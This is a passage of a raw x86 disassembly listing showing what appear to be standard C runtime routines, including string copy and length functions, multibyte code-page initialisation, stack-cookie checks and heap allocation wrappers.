  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
